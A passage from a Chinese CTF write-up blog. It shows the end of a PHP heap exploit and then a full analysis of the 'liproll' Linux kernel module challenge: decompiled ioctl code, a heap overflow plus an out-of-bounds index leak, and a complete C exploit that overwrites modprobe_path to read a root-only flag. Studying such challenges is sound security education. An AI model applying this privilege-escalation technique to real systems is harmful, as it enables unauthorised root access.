class="keyword">include</span> <span class="string">&quot;/proc/self/maps&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="variable">$base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$ret</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$libc</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$sys</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">hackphp_create</span>(<span class="number">0x210</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">i2s</span>(<span class="variable">$base</span> + <span class="number">0x4178</span>-<span class="number">0x20</span>);</span><br><span class="line"><span class="title function_ invoke__">hackphp_edit</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>,<span class="number">0x210</span>-<span class="number">0x20</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">i2s</span>(<span class="variable">$base</span>+<span class="number">0x4070</span>),(<span class="number">0x210</span>-<span class="number">0x20</span>)/<span class="number">8</span>);</span><br><span class="line"><span class="comment">// sleep(5);</span></span><br><span class="line"><span class="title function_ invoke__">hackphp_edit</span>(<span class="title function_ invoke__">i2s</span>(<span class="variable">$libc</span>+<span class="number">0x55410</span>));</span><br><span class="line"><span class="title function_ invoke__">hackphp_create</span>(<span class="number">0x108</span>);</span><br><span class="line"><span class="title function_ invoke__">hackphp_edit</span>(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">hackphp_delete</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="liproll"><a href="#liproll" class="headerlink" title="liproll"></a>liproll</h2><p><code>kernelpwn</code></p>
<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>首先我们看一下启动的脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -kernel ./bzImage \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">        -initrd ./rootfs.cpio \</span><br><span class="line">        -nographic \</span><br><span class="line">        -m 2G \</span><br><span class="line">        -s \</span><br><span class="line">        -smp cores=2,threads=2,sockets=1 \</span><br><span class="line">        -monitor /dev/null</span><br></pre></td></tr></table></figure>

<p>开启了<code>kaslr</code>，解压<code>rootfs.cpio</code>，看到其中的<code>init</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">chown</span> -R root:root /bin /usr /root</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;flag&#123;this_is_a_test_flag&#125;&quot;</span> &gt; /root/flag</span><br><span class="line"><span class="built_in">chmod</span> -R 400 /root</span><br><span class="line"><span class="built_in">chmod</span> -R o-r /proc/kallsyms</span><br><span class="line"><span class="built_in">chmod</span> -R 755 /bin /usr</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /root/banner</span><br><span class="line">insmod /liproll.ko</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 777 /dev/liproll</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">poweroff -d 1800000 -f &amp;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>也就是说<code>liproll.ko</code>就是包含漏洞的模块了，用<code>ida</code>分析一下，该模块提供了一些基本的函数，首先我们来看一下<code>ioctl</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">liproll_unlocked_ioctl</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xD3C7F03</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    add();</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="number">0xD3C7F03</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0xD3C7F04</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    show(a3);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0xD3C7F01</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0xD3C7F02</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        global_buffer = <span class="number">0LL</span>;</span><br><span class="line">        *(&amp;global_buffer + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cast_a_spell(a3);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据传入的<code>cmd</code>的不同调用了不同的函数。我们依次来看一下，首先是<code>add</code>函数，也就是<code>create_a_spell</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">create_a_spell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 index; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    index = (<span class="type">int</span>)v0;</span><br><span class="line">    <span class="keyword">if</span> ( !lists[v0] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 == <span class="number">0x10</span> )</span><br><span class="line">      <span class="keyword">return</span> printk(<span class="string">&quot;[-] Full!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">8</span>], <span class="number">0xCC0</span>LL, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> kmalloc_err();</span><br><span class="line">  lists[index] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是固定分配了一个<code>0x100</code>大小的堆块然后将分配得到的地址写入到了<code>lists</code>数组中，该数组的元素个数为<code>0x10</code>个。接着是<code>show</code>函数，也就是<code>choose_a_spell</code>函数，该函数将用户指定的<code>lists[index]</code>中保存的堆块地址赋值到<code>global_buffer</code>全局变量中。然后是<code>reset_spell</code>也就是<code>cmd=0xD3C7F02</code>发生的系统调用，这里是将<code>global_buffer</code>清空。</p>
<p>最后是<code>cast_a_spell</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">cast_a_spell</span><span class="params">(__int64 *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  __int64 buf; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE kernel_buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> copyed_size; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+110h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !global_buffer )</span><br><span class="line">    <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))cast_a_spell_cold)();</span><br><span class="line">  v6 = global_buffer;</span><br><span class="line">  size = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  v2 = <span class="number">0x100</span>;</span><br><span class="line">  buf = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x100</span> )</span><br><span class="line">    v2 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  copyed_size = v2;</span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(kernel_buf, buf, size) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(global_buffer, kernel_buf, *((<span class="type">unsigned</span> <span class="type">int</span> *)a1 + <span class="number">2</span>));</span><br><span class="line">    global_buffer = v6;</span><br><span class="line">    *((_DWORD *)&amp;global_buffer + <span class="number">2</span>) = copyed_size;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数中最为重要的就是两个拷贝操作了，首先是<code>copy_from_user(kernel_buf, buf, size)</code>，这里的<code>buf</code>是用户输入的<code>buf</code>，也就是首先按照用户指定的大小将用户指定的内容拷贝到<code>kernel_buf</code>数组中，接着是<code>memcpy(global_buffer, kernel_buf, *((unsigned int *)a1 + 2));</code>也是按照用户指定的大小将<code>kernel_buf</code>中的数据拷贝到<code>global_buffer</code>也就是之前分配的堆块中。这里很明显的可以看到有堆溢出，虽然在拷贝之前进行了<code>size</code>的验证，但是拷贝过程中却是使用的用户指定的<code>size</code>。</p>
<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p>首先我们看一下溢出可以覆盖什么，这里溢出直接溢出的是<code>global_buffer</code>和<code>kernel_buffer</code>，<code>kernel_buffer</code>溢出之后会覆写<code>v6</code>，然而我们看到<code>v6</code>最终会被赋值为<code>global_buffer</code>，也就是我们可以通过溢出控制<code>global_buffer</code>指针，达到任意地址写的效果。</p>
<p>但是这里还存在一个问题就是地址泄漏。这里就需要利用到另一个漏洞，也就是索引越界，所有的函数并没有对<code>lists[index]</code>的索引值进行检查，因此存在一个索引越界的漏洞，而<code>lists</code>数组的高地址位置恰好为<code>vmlinux_base</code>也就是内核的基地址，这是在<code>open</code>函数中进行赋值的。因此这里可以读取<code>vmlinux_base</code>中指向的代码块的内容。从代码中可以根据重定位之后的数据泄漏的到<code>vmlinux</code>的基地址。也就是得到了内核基地址。</p>
<p>这里使用的是覆写<code>modprobe_path</code>的方法。将其覆写为指定的脚本，那么当程序执行一个错误的二进制文件的时候脚本就会被触发执行。</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>这里遇到一个问题就是通过<code>lsmod</code>或者直接<code>cat /proc/module</code>显示出来的基地址和<code>ida</code>中的函数偏移无法对应。之后才知道这是内核开启了<code>FG_KASLR</code>机制，该机制是<code>KASLR</code>的加强版，全称是<code>Function Granular KASLR</code>，译为函数颗粒化地址随机分布。一般来说开启了<code>KASLR</code>，会使得目标文件加载到内存的其实地址随机化，而<code>FG-KASLR</code>则是按照函数级别对内核代码进行重新排列。也就是说我们无法直接通过泄漏出内核的其实地址而根据<code>offset</code>确定对应的函数地址了，因为此时函数之间的顺序被打乱了。</p>
<p>在调试的时候可以通过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/module/liproll/sections/.text.cast_a_spell</span><br></pre></td></tr></table></figure>

<p>来依次确定我们想要的函数的地址，再下断点。</p>
<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">spell_struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sz;</span><br><span class="line">&#125;Spell;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/liproll&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cast_spell</span><span class="params">(<span class="type">char</span>* buf,<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    Spell sp;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;sp,<span class="number">0</span>,<span class="keyword">sizeof</span>(Spell));</span><br><span class="line">    sp.buf = buf;</span><br><span class="line">    sp.sz = sz;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == ioctl(fd,<span class="number">0xD3C7F01</span>,&amp;sp))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]err when ioctl cast spell.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reset_spell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == ioctl(fd,<span class="number">0xD3C7F02</span>,buf))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]err when ioctl reset spell.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_spell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == ioctl(fd,<span class="number">0xD3C7F03</span>,buf))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]err when ioctl create spell.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">choose_spell</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == ioctl(fd,<span class="number">0xD3C7F04</span>,&amp;idx))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]err when ioctl choose spell.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//leak sth</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x200</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /root/flag /tmp/flag\n/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/getflag.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/getflag.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/ll&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/ll&quot;</span>);</span><br><span class="line">	init();</span><br><span class="line">    create_spell();</span><br><span class="line">    create_spell();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    choose_spell(<span class="number">0</span>);</span><br><span class="line">    read(fd,buf,<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">//leak sth about the slab ?</span></span><br><span class="line">    choose_spell(<span class="number">16</span>);</span><br><span class="line">    read(fd,buf,<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">//leak vmlinux base</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> leak_vmliux = *(<span class="type">unsigned</span> <span class="type">int</span>*)((<span class="type">char</span>*)(buf+<span class="number">0x69</span>));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> vmlinux_base = <span class="number">0xffffffff00000000</span> + leak_vmliux - <span class="number">0x6f</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> request_module = (<span class="number">0xffffffffb4662180</span><span class="number">-0xffffffffb3e00000</span>) + vmlinux_base;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> modprobe_path  = (<span class="number">0xffffffffb5248460</span><span class="number">-0xffffffffb3e00000</span>) + vmlinux_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]vmlinux base : 0x%llx\n&quot;</span>,vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]request module : 0x%llx\n&quot;</span>,request_module);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]modprobe path : 0x%llx\n&quot;</span>,modprobe_path);</span><br><span class="line">    <span class="comment">//overwrite the modprobe_path</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(buf+<span class="number">0x100</span>) = modprobe_path;</span><br><span class="line">    choose_spell(<span class="number">0</span>);</span><br><span class="line">    cast_spell(buf,<span class="number">0x108</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf,<span class="string">&quot;/tmp/getflag.sh&quot;</span>,<span class="number">0x20</span>);</span><br><span class="line">    cast_spell(buf,<span class="number">0x20</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/ll&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /tmp/flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.jianshu.com/p/4272e0805da3">TEA、XTEA、XXTEA加密解密算法</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">LYYL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lyyl.online/posts/3469048985.html">https://www.lyyl.online/posts/3469048985.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lyyl.online" target="_blank">LYYL' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-62.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/3399981355.html"><img class="prev-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-76.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CVE-2020-14364 QEMU 越界读写漏洞复现&amp;分析</div></div></a></div><div class="next-post pull-right"><a href="/posts/4269520279.html"><img class="next-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-14.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2020 纵横杯线下 WP</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LYYL</div><div class="author-info__description">毋忧拂意，毋喜快心，毋恃久安，毋惮初难。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/liuzhongchina521" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:liuzhongchina521@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客内容为Notion导出markdown，如有错误敬请谅解。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#d3dev"><span class="toc-text">d3dev</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d3dev-revenge"><span class="toc-text">d3dev-revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 